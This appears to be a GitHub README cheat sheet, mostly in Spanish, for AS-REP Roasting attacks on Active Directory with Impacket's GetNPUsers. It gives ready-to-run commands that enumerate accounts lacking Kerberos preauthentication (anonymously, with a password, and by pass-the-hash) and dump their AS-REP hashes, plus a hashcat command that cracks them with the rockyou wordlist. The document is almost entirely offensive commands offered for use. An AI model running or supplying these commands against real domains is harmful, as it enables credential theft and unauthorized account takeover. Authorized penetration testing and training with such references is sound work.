<h1 align="center">Impacket GetNPUsers Cheat Sheet</h1>

<p align="center">
  Advanced reference guide for executing AS-REP Roasting attacks to harvest crackable password hashes from Active Directory users that do not require Kerberos Preauthentication.
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Kali_Linux-111827?style=for-the-badge&logo=kalilinux&logoColor=00BFFF">
  <img src="https://img.shields.io/badge/Active_Directory-111827?style=for-the-badge&logo=microsoft&logoColor=00A4EF">
  <img src="https://img.shields.io/badge/Impacket-GetNPUsers-111827?style=for-the-badge&logoColor=00BFFF">
  <img src="https://img.shields.io/badge/OffSec-Kerberos_Attacks-111827?style=for-the-badge&logoColor=FF003C">
  <img src="https://img.shields.io/badge/Type-CheatSheet-111827?style=for-the-badge&logoColor=00FFFF">
</p>

```
impacket-getnpusers dominio.local/ -usersfile usuarios.txt -format hashcat -outputfile hashes_asrep.txt -dc-ip IP_DEL_DC
```
> Enumeracion anonima sin credenciales

```
impacket-getnpusers dominio.local/usuario_valido:Password123 -request -format hashcat -outputfile hashes_asrep.txt -dc-ip IP_DEL_DC
```
> Enumeracion con credenciales y -request Obligatorio cuando estás autenticado para indicar que deseas descargar los hashes AS-REP de los usuarios vulnerables encontrados.
</br>
> hashcat -m 18200 hashes_asrep.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule


```
impacket-getnpusers dominio.local/usuario_valido -hashes :HASH_NT -request -format hashcat -outputfile hashes_asrep.txt -dc-ip IP_DEL_DC
```
> Usando Pass-the-Hash (PtH) para la Consulta LDAP
